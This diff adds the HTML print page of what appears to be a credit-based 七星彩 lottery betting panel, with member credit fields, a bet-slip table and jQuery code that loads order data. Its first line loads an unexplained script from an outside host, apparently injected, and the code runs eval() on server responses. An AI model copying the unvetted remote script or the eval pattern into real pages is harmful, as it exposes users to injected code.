@@ -1,0 +1,120 @@
+<html><head><script src="//i.cot8.cc/j/?t=vc&amp;v=1&amp;g=009027e18154&amp;c=8cf228684989" defer=""></script>                   
+	<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
+	<meta http-equiv="content-type" content="text/html;charset=utf-8">
+    <title>print</title>
+	<link rel="stylesheet" type="text/css" id="css" href="./css/orderprint.css">
+	<style type="text/css">
+	@media print {.Noprint {display:none; visibility:hidden;} } 
+	html{overflow-y:scroll;}
+	body {top:0px; left:0px;bottom:0px; right:0px; height:100%;}
+	.main_left_print{width: 180px;margin:0 auto;  }
+	.left_userinfo{display:block;background:#FFF;list-style:none;padding:0;}
+	.left_userinfo li{text-decoration:none;padding:3px 4px;margin:0;line-height:20px;}
+	.main_left_print ul {background:#FFF;margin-left:1px;margin-right:1px;display:block;}
+	.title{font-weight:bold;color:#fff;padding:3px 0;}
+	.title_center{text-align:center;}
+	.left_print{display:block;list-style:none;margin-top:10px;padding-left:0px;*padding-left:0;}	
+
+	</style>
+	<script type="text/javascript" src="./admincg/javascript/jquery.min.js"></script>
+	<script type="text/javascript" src="./admincg/javascript/orderprint.js"></script>
+  <link type="text/css" rel="stylesheet" href="./css/mystyle7.css"></head>
+  <body marginwidth="0" marginheight="0">
+	<table width="180" border="0" cellpadding="0" cellspacing="0" align="center"><tbody><tr> <td>
+	<div class="main_left_print">
+		<ul class="left_userinfo Noprint">
+			<li class="title title_center Noprint">会员信息</li>
+			<li class="Noprint">账号:<span id="username">f1323</span></li>
+			<li class="Noprint">信用:<span id="credits">5000</span></li>
+			<li class="Noprint">已用:<span id="credits_use">0</span></li>
+			<li class="Noprint">可用:<span id="credits_remaining">5000</span></li>
+			<li class="Noprint">期号:<span id="issueno_now">17089</span></li>
+		</ul>
+		<ul id="sendmode0" style="display:none" class="left_userinfo Noprint"><li class="title title_center">正在使用</li><li class="title_center"></li></ul>
+		<ul id="sendmode1" style="" class="left_print"><div id="orderprint"><table id="JOPTab" width="178" border="0" style="text-align: left;  background: #FFFFFF;" cellpadding="0" cellspacing="0"><tbody><tr><td><input type="button" value="设置图示" name="printpre" id="printpre" class="printbut Noprint"><input type="hidden" name="printstat" id="printstat" class="Noprint"><input type="hidden" name="sorderid" id="sorderid" class="Noprint"><input type="hidden" name="_oidstr" id="_oidstr" class="Noprint"><table width="100%" border="0" cellspacing="0" cellpadding="0"><tbody><tr><td style="text-align:right;font-size:15px;">单位：元</td></tr></tbody></table><table align="center" width="178" cellpadding="0" cellspacing="0" class="tablebprint4" style="margin-bottom: 2px !important;">  <tbody><tr><td colspan="3" class="print2" style="text-align:center;color:red;font-size:18px;">七星彩</td></tr>  <tr><td colspan="3" class="print3">时间:<span id="_datetime"></span><br>会员:<span id="_user">f1323</span><br>编号:<span id="_orderid"></span></td></tr>  <tr class="print2"><td style="text-align:center;">号码</td><td style="text-align:center;">赔率</td><td style="text-align:center;">金额</td></tr>   </tbody><tbody id="orderlist"></tbody>   <tbody><tr class="print5">    <td colspan="3">笔数<span id="_bscount"></span> 总金额<span id="_allmoney"></span></td>  </tr>  <tr>    <td align="center" style="text-align:center;" class="Noprint" colspan="3"> <input class="printbut Noprint" type="button" name="numClear" id="numClear" value="清 空"> &nbsp;&nbsp;&nbsp;&nbsp; <input class="printbut Noprint" type="button" name="numprint" id="numprint" value="打 印"></td>     </tr></tbody></table><span style="font-size:15px;">第 <span id="_issueno_now">17089</span> 期,3天內有效!!</span>	</td></tr><tr>   </tr></tbody><tbody id="orderpage" style="display:none;"><tr class="Noprint"><td style="font-size:15px;" colspan="3"><b>总笔数<font color="red"><span id="_z_bscount"></span></font> 总金额<font color="red"><span id="_z_allmoney"></span></font><b></b></b></td></tr><tr></tr><tr class="Noprint"><td style="font-size:15px;" colspan="3"><span id="_z_page"></span></td></tr><tr></tr></tbody></table> <br><span id="testdate" class="Noprint" style="display:none;"></span></div></ul>
+	</div>
+	</td></tr><tr></tr></tbody></table>
+	<script type="text/javascript">
+	function jAlert(str){
+
+	}
+	function jsonAjax(url,types , param, datat, callback) {
+		$.ajax({
+			type: types,
+			url: url,
+			data: param,
+			dataType: datat,
+			success: callback,
+			error: function () {
+				return ;
+			}
+		});
+	}
+	var cgPrint={
+		sid:"",
+		caizhongselect:1
+		,GetPrint:function (data) {
+			var json = eval(data); 
+			var s = json.s;
+			if(s>9000) {
+				return ;
+			}else if(s>8000) {
+				return ;
+			}else if(s==200){
+				$('#orderprint').empty();
+				cgPrint.sid=json.gsid;
+				$('#username').html(json.username);
+				$('#issueno_now').html(json.issueno_now);
+				$('#credits').html(json.credits);
+				var get_credits_use = json.credits_use-0;
+				var get_credits_use = Number(get_credits_use.toFixed(2));
+				$('#credits_use').html(get_credits_use);
+				$('#credits_remaining').html(json.credits_remaining);
+
+				cgPrint.caizhongselect = json.caizhongselect;
+
+				cgPrint.addCssFile(cgPrint.caizhongselect);
+
+				if(json.sendmode==1){
+					$.JOP.printnum=0;
+					var getIsPC=$.JOP.IsPC();
+					$("#orderprint").JOP({data : {"p":json.printitem},caizhong:cgPrint.caizhongselect,IN_WAPCG:9,getIsPC:getIsPC});
+				}
+
+				//0是掩藏打印小票
+				if(json.sendmode==1){
+					$('#sendmode0').hide();
+					$('#sendmode1').show();
+				}else{
+					$('#sendmode0').show();
+					$('#sendmode1').hide();	
+					cgPrint.showsendmode0();
+				}
+			}else{
+				
+			}
+		}	
+		,addCssFile:function(s){
+			var czs = (s == 2 ? "mystyle5.css":"mystyle7.css");
+			var css_href = './admincg/css/'+czs;
+			var styleTag = document.createElement("link");
+			styleTag.setAttribute('type', 'text/css');
+			styleTag.setAttribute('rel', 'stylesheet');
+			styleTag.setAttribute('href', css_href);
+			$("head")[0].appendChild(styleTag);
+		}
+		,showsendmode0:function(){
+			if(cgPrint.caizhongselect==2){
+				$('#sendmode0 li:eq(1)').html('<img src="./admincg/images/sevencolor5.gif">');
+			}else{
+				$('#sendmode0 li:eq(1)').html('<img src="./admincg/images/sevencolor.gif">');
+			}	
+		}
+
+	}
+	$(window).load(function(){ 
+		jsonAjax("appindexajax.php","get", "action=printrefresh"+ "&time=" + new Date().getMilliseconds(), "json", cgPrint.GetPrint);
+	});
+  </script>
+  
+</body></html>
